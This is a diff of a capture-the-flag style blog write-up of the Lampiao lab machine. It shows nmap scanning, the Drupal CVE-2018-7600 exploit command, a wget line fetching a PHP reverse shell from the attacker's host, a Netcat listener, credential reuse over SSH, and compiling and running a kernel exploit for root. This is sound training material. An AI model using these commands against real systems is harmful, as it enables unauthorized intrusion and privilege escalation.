@@ -36,13 +36,13 @@ This blog post is a writeup of the Lampiao machine from Proving grounds play.
 
 There's a webserver, a SSH service and another interesting open port (1898) running on this box.
 
-![nmap1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\1.JPG)
+![nmap1](\assets\images\pg-play-lampiao\1.JPG)
 
 Let's take a closer look at these ports with Nmap.
  ```
  nmap -A 192.168.201.48 -p 22,80,1898 -o nmap_lampiao.txt
  ```
-![nmap2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\2.JPG)
+![nmap2](\assets\images\pg-play-lampiao\2.JPG)
 
 
 As we can see in the last picture, the 1898 port it's running an HTTP service. Nmap HTTP enum returns some interesting files as CHANGELOG.TXT
@@ -50,7 +50,7 @@ As we can see in the last picture, the 1898 port it's running an HTTP service. N
 CHANGELOG.txt it's a common file in Drupal which shows the current version.
 In this case the current version it's `7.54`.
 
-![changelog](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\5.JPG)
+![changelog](\assets\images\pg-play-lampiao\5.JPG)
 
 
 `Drupal 7.54` it's vulnerable to a remote code execution as we can see in `CVE-2018-7600` --> https://www.drupal.org/sa-core-2018-002
@@ -61,13 +61,13 @@ The first step was to check the vulnerability. I successfully executed the explo
  python3 drupa7-CVE-2018-7600.py http://192.168.201.48:1898 -c id
  ```
 
-![exploit1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\6.JPG)
+![exploit1](\assets\images\pg-play-lampiao\6.JPG)
 
 
 Now, in order to gain access to the victim's machine, I uploaded a PHP revershell to the webserver.
 
 Configuring the webshell:
-![shell1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\7.JPG)
+![shell1](\assets\images\pg-play-lampiao\7.JPG)
 
 After configuring the webshell, I opened an HTTP server on my Kali machine with python in my webshell directory:
  ```
@@ -78,17 +78,17 @@ To upload the webshell I used the python exploit to execute a wget command on th
  ```
  python3 drupa7-CVE-2018-7600.py http://192.168.201.48:1898 -c "wget http://192.168.45.177:443/php-reverse-shell.php"
  ```
-![exploit2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\8.JPG)
+![exploit2](\assets\images\pg-play-lampiao\8.JPG)
 
 
 At this point, I was able to access to my webshell on victim's machine and capture the shell running a Netcat listener.
-![shell2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\10.JPG)
+![shell2](\assets\images\pg-play-lampiao\10.JPG)
 
-![shell3](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\9.JPG)
+![shell3](\assets\images\pg-play-lampiao\9.JPG)
 
 
 Having access to www-data user I was able to find the first flag:
-![userflag](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\userf.jpg)
+![userflag](\assets\images\pg-play-lampiao\userf.jpg)
 
 
 
@@ -97,10 +97,10 @@ Having access to www-data user I was able to find the first flag:
 In order to elevete my privileges I used Linpeas.sh --> https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
 Linpeas found the following files with an interesting credentials:
-![creds](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\15.JPG)
+![creds](\assets\images\pg-play-lampiao\15.JPG)
 
 This credentials allowed me to log in via SSH with "tiago" user
-![kernel1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\18.JPG)
+![kernel1](\assets\images\pg-play-lampiao\18.JPG)
 
 
 Linpeas found a kernel vulnerability too:
@@ -116,7 +116,19 @@ Linpeas found a kernel vulnerability too:
 ```
 
 Kernel version:
-![kernel2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\13.JPG)
+![kernel2](\assets\images\pg-play-lampiao\13.JPG)
 
+To exploit this vulnerability I downloaded the exploit and compiled it with:
+```
+g++ -Wall -pedantic -02 -std=c++11 -pthread -o exploit 40847.cpp -lutil
+```
 
-![kernel3](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\13.JPG)
+After compiling, I ran the exploit with:
+```
+./exploit -s
+```
+![kernel3](\assets\images\pg-play-lampiao\13.JPG)
+
+As we can see in the last picture, I was able to gain access to root user executing this kernel exploit.
+Root access allowed me to find the last flag:
+![kernel3](\assets\images\pg-play-lampiao\rootf.jpg)
